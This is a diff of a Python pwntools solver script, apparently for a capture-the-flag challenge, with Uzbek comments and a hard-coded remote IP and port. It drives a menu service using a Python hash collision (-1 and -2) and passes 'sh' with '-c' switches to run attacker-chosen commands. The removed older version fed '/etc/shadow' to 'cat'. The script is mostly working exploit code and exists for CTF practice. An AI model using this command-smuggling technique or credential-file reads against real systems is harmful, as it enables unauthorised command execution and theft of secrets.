@@ -1,46 +1,40 @@
-import socket
-import time
+from pwn import *
+
+# Server ma'lumotlari
+host = '154.57.164.68'
+port = 31363
 
 def solve():
-    host = '154.57.164.68'
-    port = 31363
-
-    # Serverga ulanish
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-    
-    def send_cmd(cmd):
-        s.sendall(cmd.encode() + b'\n')
-        time.sleep(0.5) # Server javob berishiga ozgina vaqt
-
-    # 1. Mode o'rnatish: -1
-    send_cmd("1")
-    send_cmd("-1")
-
-    # 2. Bin o'rnatish: cat (yoki istalgan 2-3 harfli mavjud dastur)
-    send_cmd("2")
-    send_cmd("cat")
-
-    # 3. Argumentlarni yuborish
-    # Maqsad: 
-    # debug[0] = 1 (error) * -1 = -1
-    # debug[1] = 2 (not found/usage error) * -1 = -2
-    # Diqqat: 'cat' birinchi argumentda 1, ikkinchisida 2 qaytarishi uchun:
-    send_cmd("3")
-    send_cmd("/etc/shadow,notexist") 
-
-    # 4. Switchlarni yuborish
-    send_cmd("4")
-    send_cmd(".,.") 
-
-    # 5. Beat the competitor!
-    send_cmd("5")
-
-    # Barcha javoblarni o'qish
-    time.sleep(1)
-    response = s.recv(4096).decode()
-    print(response)
-    s.close()
+    try:
+        r = remote(host, port)
+        
+        # 1. Mode: -1 (hash(-1) == hash(-2) bo'lishi uchun)
+        r.sendlineafter(b'> ', b'1')
+        r.sendlineafter(b'(mode)> ', b'-1')
+        
+        # 2. Bin: sh (isalpha() shartiga mos keladi)
+        r.sendlineafter(b'> ', b'2')
+        r.sendlineafter(b'(bin)> ', b'sh')
+        
+        # 3. Arguments: Bu yerda biz exit kodlarni boshqaramiz
+        # subprocess.run(['sh', switch, arg])
+        # arg1: "exit 1", arg2: "exit 2"
+        r.sendlineafter(b'> ', b'3')
+        r.sendlineafter(b'(arg1,arg2)> ', b'exit 1,exit 2')
+        
+        # 4. Switches: sh uchun -c argumenti kerak (command bajarish uchun)
+        r.sendlineafter(b'> ', b'4')
+        r.sendlineafter(b'(switch1,switch2)> ', b'-c,-c')
+        
+        # 5. Beat the competitor!
+        r.sendlineafter(b'> ', b'5')
+        
+        # Server javobini o'qiymiz
+        response = r.recvall(timeout=3).decode()
+        print(response)
+        
+    except Exception as e:
+        print(f"Xatolik: {e}")
 
 if __name__ == "__main__":
     solve()
